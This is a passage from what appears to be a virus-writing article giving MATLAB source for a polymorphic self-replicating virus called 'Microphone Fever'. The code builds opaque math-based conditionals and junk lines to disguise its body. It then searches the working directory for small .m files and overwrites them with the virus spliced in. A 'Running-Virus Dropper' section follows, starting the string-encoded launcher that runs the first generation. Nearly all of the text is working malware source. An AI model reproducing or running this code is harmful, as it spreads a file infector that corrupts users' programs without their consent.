        RandNameCol{end+1}='if';while (any(strcmp({FfAll{:} DfAll{:} Rnames{:} RandNameCol{1:end-1}},RandNameCol{end}))||iskeyword(RandNameCol{end})) RandNameCol{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end
    end

    CODE=NewCode{ObfusCount};
    TRASH=TrashLine{ObfusCount};

    WhichMathAlgo=fix(rand*5);
    if (WhichMathAlgo==1 || WhichMathAlgo==3)
        FReplacePool1={'sin' 'cos' 'exp' 'atan'};
        StartFunction='SOS';SReplacePool1={'(SOS)' 'F(S)' 'if' 'if'};
        while(~isempty(strfind([FReplacePool1{:}], SReplacePool1{3}))||iskeyword(SReplacePool1{3}))SReplacePool1{3}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end
        SReplacePool1{4}=SReplacePool1{3};  OReplacePool1={'.*' '+'};
        while length(strfind(StartFunction,'S'))+length(strfind(StartFunction,'O'))+length(strfind(StartFunction,'F'))>0
            TmpVar001=fix(rand*length(SReplacePool1)+1); StartFunction=regexprep(StartFunction, 'S',SReplacePool1{TmpVar001},rand*length(strfind(StartFunction,'S'))+1); if (TmpVar001>2 && strcmp(SReplacePool1{3}, SReplacePool1{4})); while(~isempty(strfind(SReplacePool1{4},SReplacePool1{3})) || ~isempty(strfind(SReplacePool1{3},SReplacePool1{4})) || ~isempty(strfind([FReplacePool1{:}], SReplacePool1{4})) || iskeyword(SReplacePool1{4})) SReplacePool1{4}=char(fix(rand(1,fix(rand*4)+2)*25)+97); end; end;
            StartFunction=regexprep(StartFunction, 'O',OReplacePool1{fix(rand*length(OReplacePool1)+1)},rand*length(strfind(StartFunction,'O'))+1);
            StartFunction=regexprep(StartFunction, 'F',FReplacePool1{fix(rand*length(FReplacePool1)+1)},rand*length(strfind(StartFunction,'F'))+1);
            if (max(cumsum(StartFunction=='(')-cumsum(StartFunction==')'))>25) SReplacePool1{1}=SReplacePool1{3}; SReplacePool1{2}=SReplacePool1{4}; end;      % restricting the function to depth<25
        end
    end

    if (WhichMathAlgo==0)
        MatSizeN=fix(rand*5)+3;
        SomeMatVec{1}=[RandNameCol{end} '=[']; SomeMatVec{2}=[RandNameCol{end-1} '=[']; SomeMatVec{3}=[RandNameCol{end-2} '=['];
        MultFct=rand*30;
        for Count011=1:MatSizeN        
            SomeMatVec{1}=[SomeMatVec{1} ' ' num2str(rand(1,1)*MultFct)];
            SomeMatVec{2}=[SomeMatVec{2} ';' num2str(rand(1,1)*MultFct)];
            SomeMatVec{3}=[SomeMatVec{3} ';'];
            for Count012=1:MatSizeN
                SomeMatVec{3}=[SomeMatVec{3} ' ' num2str(rand(1,1)*MultFct)];
            end
        end
        SomeMatVec{1}=[SomeMatVec{1} '];']; SomeMatVec{1}(size(RandNameCol{end},2)+3)=''; eval(SomeMatVec{1});
        SomeMatVec{2}=[SomeMatVec{2} '];']; SomeMatVec{2}(size(RandNameCol{end-1},2)+3)=''; eval(SomeMatVec{2});
        SomeMatVec{3}=[SomeMatVec{3} '];']; SomeMatVec{3}(size(RandNameCol{end-2},2)+3:size(RandNameCol{end-2},2)+4)=''; eval(SomeMatVec{3});
        SpecMatName={'toeplitz','vander'}; SpecVecName={'pascal','magic','hilb','invhilb','wilkinson'};
        WhichMatrixAlgo=fix(rand*5);
        if (WhichMatrixAlgo==0)                              % Matrix by vectors multiplication
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};                % write both vectors
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{2};
            MatXNameXX=[RandNameCol{end-1} '*' RandNameCol{end}];
        elseif (WhichMatrixAlgo==1)                        % Direct matrix
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{3};  % just write matrix
            MatXNameXX=[RandNameCol{end-2}];
        elseif (WhichMatrixAlgo==2)                        % Vector input
            Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};  % just write row vector
            MatXNameXX=[SpecMatName{fix(rand(1,1)*length(SpecMatName)+1)} '(' RandNameCol{end} ')'];
        elseif (WhichMatrixAlgo==3)                        % integer input
            MatXNameXX=[SpecVecName{fix(rand(1,1)*length(SpecVecName)+1)} '(' num2str(MatSizeN) ')'];
        elseif (WhichMatrixAlgo==4)                        % Rosser Test matrix
            MatXNameXX='rosser';
        end

        % Finished creating matrix; it is in MatNam
        % additional arithmetic functions
        MatArOp={'sin' 'cos' 'sinh' 'cosh' 'exp' 'tan' 'sqrt' 'real' 'imag'};
        for Count013=1:fix(rand*3+1)
            if (rand>0.66) MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatXNameXX ')']; end
        end
        % Now the matrix operation    
        VecArOp={'sum' 'max' 'min'};
        SavedVector=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' RandNameCol{end} ')'];   
        IsItAVector=1;
        if (rand>0.44) SavedVector=num2str(rand*100-50); IsItAVector=0; end;
        for Count015=1:fix(rand*3+1)
            if (rand>0.66) SavedVector=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' SavedVector ')']; end
        end
        MatXNameXX=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatXNameXX ')'];
        for Count016=1:fix(rand*3+1)
            if (rand>0.85) MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatXNameXX ')']; end
        end
        MatXNameXX=[VecArOp{fix(rand*size(VecArOp,2)+1)} '(' MatXNameXX ')'];
        for Count017=1:fix(rand*3+1)
            if (rand>0.85) MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} '(' MatXNameXX ')']; end
        end
        TmpVar002=fix(rand*4);
        Operator1=''; Operator2='';
        if (eval(SavedVector)>eval(MatXNameXX)) Operator1='>'; Operator2='<'; end
        if (eval(SavedVector)<eval(MatXNameXX)) Operator1='<'; Operator2='>'; end
        if (~isempty(Operator1))
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];                 
            if (sum(strcmp(Var2Wrt{ObfusCount},SomeMatVec{1}))==0 && IsItAVector) Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1}; end
            if (TmpVar002==0)
                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator1 MatXNameXX ')'];
            elseif (TmpVar002==1)
                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatXNameXX Operator1 '(' SavedVector '))'];
                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
            elseif (TmpVar002==2)
                ActualCodeForThisPart{ObfusCount}{1}=['if((' SavedVector ')' Operator2 MatXNameXX ')'];
                ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
                ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];  
            elseif (TmpVar002==3)                
                ActualCodeForThisPart{ObfusCount}{1}=['if(' MatXNameXX Operator2 '(' SavedVector '))'];
            end
            ActualCodeForThisPart{ObfusCount}{3}=['else'];
            ActualCodeForThisPart{ObfusCount}{5}=['end'];
        else
            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! MXT'; 
        end        

        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
        if ObfusCount
            for Count018=1:size(Var2Wrt{ObfusCount},2)
                eval(Var2Wrt{ObfusCount}{Count018});
            end
        end

    elseif (WhichMathAlgo==1)
        % One or two dimensional integration
        % S -> (SOS) | F(S) | x
        % O -> .* | +
        % F -> sin | cos | exp | atan | ...

        % eval('function out = f(x); out = sin(x); end')
        % f = inline('sin(x)')
        % eval('func=@(x)sin(x);')

                                                                                   % Matlab does not support temporary-indexing; Octave does support it, thus makes Octave a much more power-/beautiful language
        BoundAll1=cellstr(num2str(rand(5,1))); BoundAll2={'pi','log(2)','sqrt(2)','sqrt(3)',BoundAll1{:}}; BoundAll3=randperm(length(BoundAll2));

        if rand>0.6
            StartFunction=strrep(StartFunction,SReplacePool1{4},SReplacePool1{3}); % just one variable for 1d
            %InLineFunc=inline(StartFunction, SReplacePool1{3});
            BoundAll3={BoundAll2{BoundAll3(1:2)}};
            BoundSign=strrep(strrep(cellstr(num2str(rand(2,1)>0.7)),'1','-'),'0',''); BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')]}; BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{3}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{3}; BoundAll3(3)=[]; end;
            FctString1='quad'; FctString2=''; FctString3='';
           
        else
            %InLineFunc=inline(StartFunction, SReplacePool1{3}, SReplacePool1{4});
            BoundAll3={BoundAll2{BoundAll3(1:4)}};
            BoundSign=strrep(strrep(cellstr(num2str(rand(4,1)>0.7)),'1','-'),'0','');
            BoundAll3={[BoundSign{1} strrep(BoundAll3{1},' ','')],[BoundSign{2} strrep(BoundAll3{2},' ','')],[BoundSign{3} strrep(BoundAll3{3},' ','')],[BoundSign{4} strrep(BoundAll3{4},' ','')]};           
            BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];
            BoundTmpB=[eval(BoundAll3{3}) eval(BoundAll3{4})];
            if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{5}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{5}; BoundAll3(5)=[]; end;
            if(sum(abs(sort(BoundTmpB)-BoundTmpB))>0) BoundAll3{5}=BoundAll3{3}; BoundAll3{3}=BoundAll3{4}; BoundAll3{4}=BoundAll3{5}; BoundAll3(5)=[]; end;
            FctString1='dblquad'; FctString2=[',' BoundAll3{3} ',' BoundAll3{4}]; FctString3=[',' SReplacePool1{4}];
        end

        IntTolerance=fix(real(log10(eval([FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(6666) ')']))))+5;
        TimeMeasure=0;
        while (TimeMeasure<0.1 && IntTolerance>-23)
            IntTolerance=IntTolerance-1;
            CompleteCompString=[FctString1 '(@(' SReplacePool1{3} FctString3 ')' StartFunction ',' BoundAll3{1} ',' BoundAll3{2} FctString2 ',1e' num2str(IntTolerance) ')'];
            TimeMeasure=cputime;
            CompleteErg=eval(CompleteCompString);
            TimeMeasure=cputime-TimeMeasure;
            if(isnan(CompleteErg) || isinf(CompleteErg))IntTolerance=-50;end
        end        

        if (IntTolerance>-23)     
            runcode=1;
        else
            ObfusCount=ObfusCount-1;%ActualCodeForThisPart{ObfusCount}{1}='NO!!! INT';
        end

    elseif (WhichMathAlgo==2)
        % Fun with interpolation
        TmpVar003=fix(rand*50+4); TmpVar004=rand*1000; InterpDataVec=''; for Count019=0:TmpVar003 InterpDataVec=[InterpDataVec num2str(rand*TmpVar004) ' ']; end; InterpDataVec(end)='';
        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=[' InterpDataVec '];']; eval(Var2Wrt{ObfusCount}{end}); InterpSpline=''; if (rand>0.6) InterpSpline=[',' QuoteSign 'spline' QuoteSign]; end
        CompleteCompString=['interp1(' RandNameCol{end} ',' num2str(rand*(TmpVar003-1)+1) InterpSpline ')']; RandNameCol(end)=[];
        CompleteErg=eval(CompleteCompString); runcode=1;

    elseif (WhichMathAlgo==3)
        % Ordinary differential equation :)
        Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} '=inline(' QuoteSign StartFunction QuoteSign ',' QuoteSign SReplacePool1{3} QuoteSign ',' QuoteSign SReplacePool1{4} QuoteSign ');']; eval(Var2Wrt{ObfusCount}{end});
        ODEIntervallA=fix(rand*7-3);ODEIntervallB=fix(ODEIntervallA+rand*4+1);
        Var2Wrt{ObfusCount}{end+1}=['[' RandNameCol{end-1} ',' RandNameCol{end-2} ']=ode45(' RandNameCol{end} ',[' num2str(ODEIntervallA) ' ' num2str(ODEIntervallB) '],' num2str(rand*4) ');'];
        eval([Var2Wrt{ObfusCount}{end}(1:end-2) ',odeset(' QuoteSign 'OutputFcn' QuoteSign ',@odefunction));'])
        ODEDomain=eval(RandNameCol{end-1});
        ODEIntX=num2str(rand*ODEIntervallB+ODEIntervallA);
        if rand>0.5
            CompleteCompString=['interp1(' RandNameCol{end-1} ',' RandNameCol{end-2} ',' ODEIntX ')'];
        else
            CompleteCompString=['interp1(' Var2Wrt{ObfusCount}{end}(strfind(Var2Wrt{ObfusCount}{end},'=')+1:end-1) ',' ODEIntX ')'];
            Var2Wrt{ObfusCount}(end)=[];
        end

        RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];
        if (length(ODEDomain)>5&&ODEDomain(end)==ODEIntervallB) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end        
        if (isnan(CompleteErg) || isinf(CompleteErg) || ODEDomain(end)~=ODEIntervallB)
            while ~isempty(Var2Wrt{ObfusCount}) Var2Wrt{ObfusCount}(end)=[]; end
            ObfusCount=ObfusCount-1; 
        else
            runcode=1;
        end

    elseif (WhichMathAlgo==4)
        % Special functions :D
        CompleteCompString='F(F(S))'; SReplacePool2={'F(S)' 'F(S)' 'F(S)' 'F(S)' 'F(S)' 'D(S,S)' 'R' 'R'}; 
        while ~isempty(strfind(CompleteCompString,'S'))
            CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)},rand*length(strfind(CompleteCompString,'S'))+1);
            if (length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'D'))>10) SReplacePool2={'R'}; end;
        end
        CompleteCompString=regexprep(CompleteCompString, 'S',SReplacePool2{fix(rand*length(SReplacePool2)+1)});
        while length(strfind(CompleteCompString,'D'))+length(strfind(CompleteCompString,'F'))+length(strfind(CompleteCompString,'R'))>0
            CompleteCompString=regexprep(CompleteCompString, 'F',FfAll{fix(rand*length(FfAll)+1)},rand*length(strfind(CompleteCompString,'F'))+1);
            CompleteCompString=regexprep(CompleteCompString, 'D',DfAll{fix(rand*length(DfAll)+1)},rand*length(strfind(CompleteCompString,'D'))+1);
            CompleteCompString=regexprep(CompleteCompString, 'R',num2str(rand*10-5),rand*length(strfind(CompleteCompString,'R'))+1);
        end
        if (max(cumsum(CompleteCompString=='(')-cumsum(CompleteCompString==')'))<25) CompleteErg=eval(CompleteCompString); else CompleteErg=NaN; end
        if (isnan(CompleteErg) || isinf(CompleteErg))
            ObfusCount=ObfusCount-1;
        else
            runcode=1;
        end       
    end

    if (runcode)
        RCWriteVar=0;RCNumSub='0';RCNumAdd='0';
        while (~(CompleteErg>eval(RCNumSub))||~(eval(RCNumSub)<CompleteErg)||~(CompleteErg<eval(RCNumAdd))||~(eval(RCNumAdd)>CompleteErg))
            if WhichMathAlgo==3 MulFacRC=8; IncFacRC=2; else MulFacRC=0.01; IncFacRC=1; end
            RCNumSub=num2str(CompleteErg-(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
            RCNumAdd=num2str(CompleteErg+(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));
        end
        
        if (rand>0.4)
            RCsSub=[RandNameCol{end} '=' RCNumSub ';']; RCNumSub=RandNameCol{end};
            RCsAdd=[RandNameCol{end} '=' RCNumAdd ';']; RCNumAdd=RandNameCol{end}; RCWriteVar=1; RandNameCol(end)=[];
        end
        ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];
        ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];
        if(RCWriteVar) Var2Wrt{ObfusCount}{end+1}=RCsSub; eval(RCsSub); end
        runcode=1;
        TmpVar005=fix(rand*4);
        
        if (TmpVar005==0)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '<' CompleteCompString ')']; end
        elseif (TmpVar005==1)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumSub ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumSub '>' CompleteCompString ')']; end
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
        elseif (TmpVar005==2)
            if (rand>0.5) ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '>' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '<' CompleteCompString ')']; end
            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end
            ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];
            ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];
        elseif (TmpVar005==3)
            if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=['if(' CompleteCompString '<' RCNumAdd ')']; else ActualCodeForThisPart{ObfusCount}{1}=['if(' RCNumAdd '>' CompleteCompString ')']; end
            if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd; eval(RCsAdd); end 
        end
        ActualCodeForThisPart{ObfusCount}{3}='else';
        ActualCodeForThisPart{ObfusCount}{5}='end';
    end
    TmpVar006=4;TmpStrWS={'' '' ' ' '' ''};
    while TmpVar006>0        
        if ObfusCount
            if (LineBreaksIf(TmpVar006)==1 && length(ActualCodeForThisPart{ObfusCount})==5)
                ActualCodeForThisPart{ObfusCount}{TmpVar006}=[ActualCodeForThisPart{ObfusCount}{TmpVar006} TmpStrWS{TmpVar006} ActualCodeForThisPart{ObfusCount}{TmpVar006+1}];
                ActualCodeForThisPart{ObfusCount}(TmpVar006+1)=[];
            end
        end
        TmpVar006=TmpVar006-1;
    end
    
    if(RandomAppearenceOfIfs)
        LineBreaksIf=fix(rand(1,4)*2); LineShift={};
        LineShift{1}(1:fix(rand*8))=' '; if rand>0.7 LineShift{1}='    ';end
        if rand>0.4
            LineShift{2}=LineShift{1};
        else
            LineShift{2}(1:fix(rand*8))=' ';
        end;
    end
    ObfusCount=ObfusCount+1;

    disp(ObfusCount/length(NewCode));
end
Var2Wrt{1}{end+1}='warning off all';
ActualCodeForThisPart{end+1}={['TheImportantValue=' TmpRndName{1} '; eval(TheImportantValue);']}; Var2Wrt{end+1}={};
ActualCodeForThisPart{end+1}={['TheValueToCompare=' QuoteSign 'disp(' QuoteSign QuoteSign 'Bedecke deinen Himmel, Zeus, Mit Wolkendunst, Und übe, dem Knaben gleich, Der Disteln köpft, An Eichen dich und Bergeshöhn; Müßt mir meine Erde Doch lassen stehn, Und meine Hütte, die du nicht gebaut, Und meinen Herd Um dessen Gluth Du mich beneidest.' QuoteSign QuoteSign ');' QuoteSign ';']};Var2Wrt{end+1}={};
ActualCodeForThisPart{end+1}={['if(strcmp(TheImportantValue,TheValueToCompare)) load gong.mat;sound(y, Fs);else disp(' QuoteSign 'SOME PROBLEM' QuoteSign '); load handel.mat; for i=1:1 sound(y, Fs); end; input(' QuoteSign 'STOP' QuoteSign '); end']};Var2Wrt{end+1}={};

if ~isempty(Var2Wrt)
    for j=1:length(Var2Wrt)
        for i=1:length(Var2Wrt{j})
            disp(Var2Wrt{j}{i});
        end
    end
end

if ~isempty(ActualCodeForThisPart)
    for j=1:length(ActualCodeForThisPart)
        for i=1:length(ActualCodeForThisPart{j})
            disp(ActualCodeForThisPart{j}{i});
        end
    end
end

eval(ViralBodyVariable);

disp('Lets start the insertation!');


VirCode={}; Count020=length(ActualCodeForThisPart);
while Count020>0
    VirCode{end+1}=ActualCodeForThisPart{Count020};
    for Count021=Count020:length(ActualCodeForThisPart)     
        if ~isempty(Var2Wrt{Count021}) if rand>0.3 VirCode{end+1}=Var2Wrt{Count021}(end); Var2Wrt{Count021}(end)=[]; end; end
    end
    Count020=Count020-1;
end

IsAllEmpty=false;
while ~IsAllEmpty
    IsAllEmpty=true;
    for Count022=1:length(Var2Wrt)
        if ~isempty(Var2Wrt{Count022})
            IsAllEmpty=false;
            if rand>0.5
                VirCode{end+1}=Var2Wrt{Count022}(end); Var2Wrt{Count022}(end)=[];
            end
        end
    end
end

%VirCode{:}

VicFiles=dir('*.m');
VicLines={};
for Count023=1:length(VicFiles)
    if (VicFiles(Count023).bytes<1000 && ~strcmp(VicFiles(Count023).name,'odefunction.m'))
        disp(VicFiles(Count023).name);
        VicIDr=fopen(VicFiles(Count023).name, 'r'); VicLines={fgetl(VicIDr)};
        while ischar(VicLines{end});
           VicLines{end+1}=fgetl(VicIDr);
        end
        VicLines(end)=[];
        %VicLines(:)

        % Remove Commands and ...

        Count024=1;
        while Count024<length(VicLines)+1
            IsAPO=0;
            Count025=1;
            while Count025<length(VicLines{Count024})+1
                if VicLines{Count024}(Count025)==QuoteSign IsAPO=~IsAPO; end
                if ~IsAPO
                    if VicLines{Count024}(Count025)==char(37)
                        if Count025==1 VicLines(Count024)=[]; else VicLines{Count024}=VicLines{Count024}(1:Count025-1); end
                    end
                    if Count025+1<length(VicLines{Count024})
                        if all(VicLines{Count024}(Count025:Count025+2)=='...')
                            VicLines{Count024}=strcat(VicLines{Count024}(1:Count025-1),VicLines{Count024+1}); Count025=1;
                            if length(VicLines)>Count024 VicLines(Count024+1)=[]; end
                        end
                    end
                end
                Count025=Count025+1;
            end
            Count024=Count024+1;
        end

        EndArray={'if' 'for' 'while' 'try' 'switch' 'parfor'}; EndCount=0;
        GoodLine=[];
        for Count026=1:length(VicLines)
            IsAPP=0;
            if ~EndCount GoodLine=[GoodLine Count026]; end
            for Count027=1:length(VicLines{Count026})
                if (VicLines{Count026}(Count027)==QuoteSign) IsAPP=~IsAPP; end
                if ~IsAPP
                    for Count028=1:length(EndArray)
                        if Count027+length(EndArray{Count028})<length(VicLines{Count026})
                            if all(VicLines{Count026}(Count027:Count027+length(EndArray{Count028})-1)==EndArray{Count028})
                                IsStart=0;
                                if (Count027==1)
                                    IsStart=1;
                                elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
                                    IsStart=1;
                                end
                                if Count027+length(EndArray{Count028})-1==length(VicLines{Count026})
                                    IsStart=IsStart+1;
                                elseif (VicLines{Count026}(Count027+length(EndArray{Count028}))==' ' || VicLines{Count026}(Count027+length(EndArray{Count028}))=='(' || VicLines{Count026}(Count027+length(EndArray{Count028}))==char(9))
                                    IsStart=IsStart+1;
                                end
                                if IsStart==2
                                    EndCount=EndCount+1;
                                end
                            end
                        end
                    end
                    if Count027+1<length(VicLines{Count026})
                        if all(VicLines{Count026}(Count027:Count027+2)=='end')                        
                            IsEnd=0;
                            if (Count027==1)
                                IsEnd=1;
                            elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
                                IsEnd=1;
                            end
                            if Count027+2==length(VicLines{Count026})
                                IsEnd=IsEnd+1;
                            elseif (VicLines{Count026}(Count027+3)==' ' || VicLines{Count026}(Count027+3)==';' || VicLines{Count026}(Count027+3)==char(9))
                                IsEnd=IsEnd+1;
                            end
                            if IsEnd==2
                                EndCount=EndCount-1;
                            end
                        end
                    end
                end
            end
        end

        NewInfCode={}; VCsplitted={};
        VirSplit=sort([0 length(VirCode) fix(rand(1,length(GoodLine)-1)*length(VirCode))]);
        TmpVar007=length(VirSplit);
        while TmpVar007>1
            if (VirSplit(TmpVar007-1)<VirSplit(TmpVar007)) VCsplitted{length(VirSplit)-TmpVar007+1}=VirCode(VirSplit(TmpVar007-1)+1:VirSplit(TmpVar007)); else VCsplitted{length(VirSplit)-TmpVar007+1}={}; end
            TmpVar007=TmpVar007-1;
        end
        GoodLine(end+1)=length(VicLines);        
        for Count029=1:length(GoodLine)-1
            NewInfCode={NewInfCode{:} VicLines{GoodLine(Count029):GoodLine(Count029+1)-1}};   
            TmpVar008=length(VCsplitted{Count029});
            while TmpVar008>0
                NewInfCode={NewInfCode{:} VCsplitted{Count029}{TmpVar008}{:}};
                TmpVar008=TmpVar008-1;
            end         
        end
        NewInfCode={NewInfCode{:} VicLines{end}};
        fclose(VicIDr);
        VicIDw=fopen(VicFiles(Count023).name, 'w+');
        for Count030=1:length(NewInfCode)
            fprintf(VicIDw,[NewInfCode{Count030} char(13) char(10)]);
        end
        fclose(VicIDw);
    end
end
delete('odefunction.m');

VicLines(:)
NewInfCode(:)
load gong.mat;
sound(y, Fs);
- - - - - - - - - - - - - 





  5) Running-Virus Dropper

     The first generation is started via a dropper, that contains the whole
     viruscode as a string. It first shows the code of the virus in the
     Matlab window, then executes it.

- - - - - - - - - - - - - 
disp('Microphone Fever - the best thing you can do within 153 seconds...');
MyCode=['warning off all;'];
MyCode=[MyCode 'MyCode=[MyCode,'' ''];'];
MyCode=[MyCode 'VarList2Change={''MyCode'' ''EncOReplacePool1'' ''EncryptThreshold'' ''TrashString'' ''GarbageString'' ''EncQReplacePool1'' ''ThisVarContainsVirus'' ''EncDiff'' ''EvaledCryptArray'' ''OrigString2Enc'' ''EncFReplacePool1'' ''TmpRndName'' ''EncSReplacePool1'' ''CPcrypt'' ''VarList2Change'' ''GiveEncString'' ''EncStartFunction'' ''ChangeNumber'' ''FfAll'' ''DfAll'' ''SplitOffset'' ''MatXNameXX'' ''EncryString'' ''CodePart'' ''Rnames'' ''NewCode'' ''TrashNames'' ''TrashLine'' ''SplitSize'' ''QuoteSign'' ''CreateTrashA'' ''CreateTrashB'' ''CreateTrashC'' ''CreateTrashD'' ''CreateTrash1'' ''CreateTrash2'' ''ODEfile'' ''odefunction'' ''RandPermSS'' ''AlgoMatrix'' ''ViralBodyVariable'' ''ActualCodeForThisPart'' ''Var2Wrt'' ''ObfusCount'' ''RandomAppearenceOfIfs'' ''LineBreaksIf'' ''LineShift'' ''runcode'' ''RandNameCol'' ''CODE'' ''TRASH'' ''WhichMathAlgo'' ''FReplacePool1'' ''StartFunction'' ''SReplacePool1'' ''OReplacePool1'' ''MatSizeN'' ''SomeMatVec'' ''MultFct'' ''SpecMatName'' ''SpecVecName'' ''WhichMatrixAlgo'' ''MatArOp'' ''VecArOp'' ''SavedVector'' ''IsItAVector'' ''Operator1'' ''Operator2'' ''BoundAll1'' ''BoundAll2'' ''BoundAll3'' ''BoundTmpA'' ''BoundTmpB'' ''BoundSign'' ''FctString1'' ''FctString2'' ''FctString3'' ''IntTolerance'' ''TimeMeasure'' ''CompleteCompString'' ''CompleteErg'' ''InterpDataVec'' ''InterpSpline'' ''ODEIntervallA'' ''ODEIntervallB'' ''ODEDomain'' ''ODEIntX'' ''SReplacePool2'' ''RCWriteVar'' ''RCNumSub'' ''RCNumAdd'' ''MulFacRC'' ''IncFa'' ''RC'' ''RCsSub'' ''RCsAdd'' ''VirCode'' ''IsAllEmpty'' ''VicFiles'' ''VicLines'' ''NewInfCode'' ''VicIDr'' ''IsAPO'' ''EndArray'' ''EndCount'' ''GoodLine'' ''IsAPP'' ''IsStart'' ''IsEnd'' ''VCsplitted'' ''VirSplit'' ''VicIDw'' ''Count000'' ''Count001'' ''Count002'' ''Count003'' ''Count004'' ''Count005'' ''Count006'' ''Count007'' ''Count008'' ''Count009'' ''Count010'' ''Count011'' ''Count012'' ''Count013'' ''Count014'' ''Count015'' ''Count016'' ''Count017'' ''Count018'' ''Count019'' ''Count020'' ''Count021'' ''Count022'' ''Count023'' ''Count024'' ''Count025'' ''Count026'' ''Count027'' ''Count028'' ''Count029'' ''Count030'' ''Count031'' ''Count032'' ''Count033'' ''TmpVar001'' ''TmpVar002'' ''TmpVar003'' ''TmpVar004'' ''TmpVar005'' ''TmpVar006'' ''TmpVar007'' ''TmpVar008''};'];
MyCode=[MyCode 'FfAll={''sin'' ''sinh'' ''asin'' ''asinh'' ''cos'' ''cosh'' ''acos'' ''acosh'' ''tan'' ''tanh'' ''atan'' ''atanh'' ''sec'' ''sech'' ''asec'' ''asech'' ''csc'' ''csch'' ''acsc'' ''acsch'' ''cot''  ''coth'' ''acot'' ''acoth'' ''exp'' ''expm1'' ''log'' ''log1p'' ''log10'' ''log2'' ''pow2'' ''sqrt'' ''nextpow2'' ''abs'' ''angle'' ''conj'' ''imag'' ''real'' ''unwrap'' ''fix'' ''floor'' ''ceil'' ''round'' ''sign'' ''airy'' ''expint''};DfAll={''hypot'' ''dot'' ''cart2pol'' ''pol2cart'' ''atan2''};TmpRndName={};for Count032=1:length(VarList2Change) TmpRndName{end+1}=''if'';while(any(strcmp({FfAll{:} DfAll{:} TmpRndName{1:end-1}},TmpRndName{end}))||iskeyword(TmpRndName{end}))TmpRndName{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end;end;for Count031=1:length(VarList2Change) MyCode=strrep(MyCode,VarList2Change{Count031},TmpRndName{Count031});end;'];
MyCode=[MyCode 'rand(''twister'',fix(sum(cputime)));SplitOffset=unique([1,sort(fix(rand(1,fix(rand*length(MyCode)/5)+3)*size(MyCode,2)+1)),size(MyCode,2)]);CodePart={};Rnames={};NewCode={};TrashNames={};TrashLine={};SplitSize=size(SplitOffset,2)-1;'];
MyCode=[MyCode 'QuoteSign=char(39);for Count033=1:SplitSize CodePart{end+1}=MyCode(SplitOffset(Count033):SplitOffset(Count033+1)-1);Rnames{end+1}=''sin'';while any(strcmp({FfAll{:} DfAll{:} Rnames{1:end-1}},Rnames{end})) Rnames{end}=char(fix(rand(1,fix(rand*15)+4)*25)+97);end;end;'];
